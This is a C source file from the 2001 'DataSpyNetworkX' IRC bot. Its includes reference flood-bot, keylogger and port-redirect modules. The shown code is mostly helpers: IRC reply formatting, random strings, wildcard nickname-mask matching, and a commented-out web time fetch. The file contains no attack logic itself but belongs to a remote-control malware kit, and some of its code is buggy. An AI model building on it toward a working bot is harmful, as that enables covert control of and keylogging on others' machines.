/* 
	DataSpyNetworkX - DataSpy2k@Hotmail.com  Copyright (C) 2001 DataSpy
	Release Source 0.4Beta.

	In no event will the author be held liable for any damages arising from the use of this code. 

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/
#include <windows.h>
#include <stdio.h>
#include <time.h>
#include "..\include\options.h"
#include "..\include\globals.h"
#include "..\include\Base.h"
#include "..\include\floodbot.h"
#include "..\include\tcp.h"
#include "..\include\file.h"
#include "..\include\IOHandler.h"
#include "..\include\MainBot.h"
#include "..\include\PortRedirect.h"
#include "..\include\SettingStorage.h"
#include "..\include\nicknames.h"
#include "..\include\keylogger.h"


char *BreakString(char *svLines, char *svTok)
{
	char *p,*s;
	char *tok;
	p=svLines;
	if(p==NULL) return NULL;

	while(*p!='\0') {
		for(s=p,tok=svTok;(*s)&&(*tok);s++,tok++) {
			if((*s)!=(*tok)) break;
		}
		if((*tok)=='\0') {
			*p='\0';
			return p+lstrlen(svTok);
		}
		p++;
	}
	return NULL;
}

/* Tbrand procedure */
unsigned long tbrand()
{
unsigned long tmp,seed=0;
	seed += GetTickCount();
	seed *= 1103515245;
	seed += rand();
	tmp=(unsigned long)LOWORD(seed);
	return(tmp);
}

int Random(int iLow, int iHigh) 
{ 
	//return iLow + rand() % (iHigh - iLow);
	return iLow + tbrand() % (iHigh - iLow);
}


BOOL bCounterRN=TRUE;
int iCounterRN=0;

char *RandomText(int iLength)
{
	if (iCounterRN++ > 20)
		iCounterRN=1;

	if(bCounterRN)
		bCounterRN = FALSE;
	else
		bCounterRN = TRUE;

	char *cOutput = new char[iLength + 1 + iCounterRN];

	int i,h;

	for (i = 0; i < iLength + iCounterRN && bCounterRN == TRUE;i++)	
		cOutput[i] = Random(97,122);

	for (i = iLength + iCounterRN - 1; i >= 0 && bCounterRN == FALSE;i--)	
		cOutput[i] = Random(97,122);

	for (i = iCounterRN,h = 0; i < iCounterRN + iLength;i++)
		cOutput[h] = cOutput[i];

	cOutput[iLength] = '\0';

	return cOutput;
}
/*
char *GetRandomString(void)
{
	srand(GetTickCount());
	int l = (rand() % 12) + 3;
	char *s = malloc(l);
	for (int i = 0; i < l; i++)
		s[i] = (rand() % 26) + 'a';
		s[l] = '\0';
	return s;
}
*/
unsigned int g_iMyMessageCount = MY_MESSAGE_STARTS_AT;
unsigned int GetNextMessageID(BOOL bCount)
{
	if (bCount)	g_iMyMessageCount++;

	return g_iMyMessageCount;
}

char cred[] = "\x02\0"; // \x30\x2C\x34\0"; Bold
char blue[] = "\0"; // x03\x38\x2C\x32\0";  Normal

char c_DEFAULT_REPLY[]	= "%s%s :%s%s%s%s%s\n";
char c_NULL_REPLY[]		= "\0";


void Reply(char *cMessage,char *cOwnerNick, char *cChannel,SOCKET The_Socket,int iNLEN)
{
	char *cTempReply = new char[1024],*cCol=0,*cEven=new char[32];

	memset(cEven,' ',MAX_NICK_LEN - iNLEN); cEven[MAX_NICK_LEN - iNLEN] =0;
	int iEnd = lstrlen(cMessage)-1;

	cMessage[iEnd] == 'r' ? cCol = cred : cCol = blue;
	cMessage[iEnd] = '\0'; //Remove the flag
	
	if (cMessage[0] == '\n') //Is this a messsage for the server only?
	{
		//sprintf(cTempReply,"%s\n",cMessage +1);
		sprintf(cTempReply,c_DOUBLE_STRINGS,cMessage +1,"\n");
	}
	else if ((unsigned char)_DSNX_REPLYTOCHAN[0] == r_CHANNEL && cChannel[0] == '#')
	{	
		//sprintf(cTempReply,"%s%s :%s%s%s-%s\n",c_PRIVMSG,cChannel,cEven,cCol,cOwnerNick,cMessage);
		//			          %s%s :%s%s%s%s%s\n
		sprintf(cTempReply,c_DEFAULT_REPLY,c_PRIVMSG,cChannel,cEven,cCol,cOwnerNick,"-",cMessage);
	}
	else if ((unsigned char)_DSNX_REPLYTOCHAN[0] == r_QUERY || (unsigned char)_DSNX_REPLYTOCHAN[0] == r_CHANNEL )
	{
		sprintf(cTempReply,c_DEFAULT_REPLY,c_PRIVMSG,cOwnerNick,cCol,cMessage,c_NULL_REPLY,c_NULL_REPLY,c_NULL_REPLY);
	}
	else if ((unsigned char)_DSNX_REPLYTOCHAN[0] == r_NOTICE)
	{
		sprintf(cTempReply,c_DEFAULT_REPLY,c_NOTICE,cOwnerNick,cEven,cCol,cMessage,c_NULL_REPLY,c_NULL_REPLY);
	}

	EasySSend(The_Socket,cTempReply);
	delete cTempReply,cEven;
}

int CmpMask(char *mask, char *name)
{
	u_char *m;		/* why didn't the old one use registers ?!??!?!?! */
	u_char *n;
	u_char cm;
//	u_char *mylowertab;
	u_char *wsn;
	u_char *wsm;

	m = (u_char *)mask;

	cm = *m;

#define lc(x) tolower(x)

	n = (u_char *)name;
	if (cm == '*')
	{
		if (m[1] == '\0')	/* mask is just "*", so true */
			return 0;
	}
	else if (cm != '?' && lc(cm) != lc(*n))
		return 1;	/* most likely first chars won't match */
	else
	{
		m++;
		n++;
	}
	cm = lc(*m);
	wsm = (unsigned char *)NULL;
	while (1)
	{
		if (cm == '*')	/* found the * wildcard */
		{
			m++;	/* go to next char of mask */
			if (!*m)	/* if at end of mask, */
				return 0;	/* function becomes true. */
			while (*m == '*')	/* while the char at m is "*" */
			{
				m++;	/* go to next char of mask */
				if (!*m)	/* if at end of mask, */
					return 0;	/* function becomes true. */
			}
			cm = *m;
			if (cm == '\\')	/* don't do ? checking if a \ */
			{
				cm = *(++m);	/* just skip this char, no ? checking */
			}
			else if (cm == '?')	/* if it's a ? */
			{
				do
				{
					m++;	/* go to the next char of both */
					n++;
					if (!*n)	/* if end of test string... */
						return (!*m ? 0 : 1);	/* true if end of mask str, else false */
				}
				while (*m == '?');	/* while we have ?'s */
				cm = *m;
				if (!cm)	/* last char of mask is ?, so it's true */
					return 0;
			}
			cm = lc(cm);
			while (lc(*n) != cm)
			{	/* compare */
				n++;	/* go to next char of n */
				if (!*n)	/* if at end of n string */
					return 1;	/* function becomes false. */
			}
			wsm = m;	/* mark after where wildcard found */
			cm = lc(*(++m));	/* go to next mask char */
			wsn = n;	/* mark spot first char was found */
			n++;	/* go to next char of n */
			continue;
		}
		if (cm == '?')	/* found ? wildcard */
		{
			cm = lc(*(++m));	/* just skip and go to next */
			n++;
			if (!*n)	/* return true if end of both, */
				return (cm ? 1 : 0);	/* false if end of test str only */
			continue;
		}
		if (cm == '\\')	/* next char will not be a wildcard. */
		{		/* skip wild checking, don't continue */
			cm = lc(*(++m));
			n++;
		}
		/* Complicated to read, but to save CPU time.  Every ounce counts. */
		if (lc(*n) != cm)	/* if the current chars don't equal, */
		{
			if (!wsm)	/* if there was no * wildcard, */
				return 1;	/* function becomes false. */
			n = wsn + 1;	/* start on char after the one we found last */
			m = wsm;	/* set m to the spot after the "*" */
			cm = lc(*m);
			while (cm != lc(*n))
			{	/* compare them */
				n++;	/* go to next char of n */
				if (!*n)	/* if we reached end of n string, */
					return 1;	/* function becomes false. */
			}
			 wsn = n;	/* mark spot first char was found */
		}
		if (!cm)	/* cm == cn, so if !cm, then we've */
			return 0;	/* reached end of BOTH, so it matches */
		m++;		/* go to next mask char */
		n++;		/* go to next testing char */
		cm = lc(*m);	/* pointers are slower */
	}
}

/*
//
//This gets the time from a webpage on bsdi.com (Problem -> potential dos on bsdi.com  :( )
//

extern long g_TickStartup;
long GetTime()
{
	SOCKET The_Socket =0;
	if ((The_Socket = SocketOpen(80,"www.bsdi.com",NULL,NULL,FALSE)) == -1)
		return 0;

	EasySSend(The_Socket,"GET http://www.bsdi.com/date?Etc/GMT HTTP/1.0\r\nHost: www.bsdi.com\r\n\r\n\0");
	char *cRecv = new char[1024];
	int iWait =0;
	long iRec=0;
	do {
		iRec = SocketRecv(The_Socket,cRecv);
		if (iRec != 0 && InStr(cRecv,"Etc/GMT</H1>")) {
			break;
		}else{
		
			Sleep(1000);
			iWait++;
		}
	}while (iWait < 7);
g_TickStartup = GetTickCount();
char *cT = strstr(cRecv,"Etc/GMT</H1>");cT +=17;cT[28] = 0;

if (cT == NULL || lstrlen(cT) != 28) return 0;

cT[3] =cT[7]=cT[10]=cT[19]=cT[23] =0; //Split Em UP

char *cMon  = cT+4,
	 *cTime = cT+11;

int iDay  = atoi(cT+8 ),
	iYear = atoi(cT+24),
	iMonMap [36] = { 'J','F','M','A','M','J','J','A','S','O','N','D',
                     'a','e','a','p','a','u','u','u','e','c','o','e',
					 'n','b','r','r','y','n','l','g','p','t','v','c' },
	iDayPM  [12] = {0,31,59,90,120,151,181,212,243,273,304,334 };
//int iDayPM [12] = {31,28,31,30 , 31, 30, 31, 31, 30, 31, 30, 31};

int iW =0,iMonth=0; BOOL found=FALSE;

while (!found)
{
	iW=0;
	found = TRUE;
	while (found && iW <3)
	{
		if (cMon[iW] == iMonMap[(iW * 12) + iMonth])
		{ 
			iW++;
		}else
		{	
			found = FALSE;
		}
	}
	iMonth++;
}

cTime[2] =cTime[5]=0;

int iHour =atoi(cTime),
 	iMin = atoi(cTime+4),
	iSec = atoi(cTime + 6);

//Return number of seconds since 2000

return ((iYear-2000)			 * 0x1E13380) + //Years
	   ((iDayPM[iMonth -1] + iDay) * 0x15180) + //Days
	   ((((iHour * 60) + iMin) * 60) + iSec);   //Seconds


}
*/
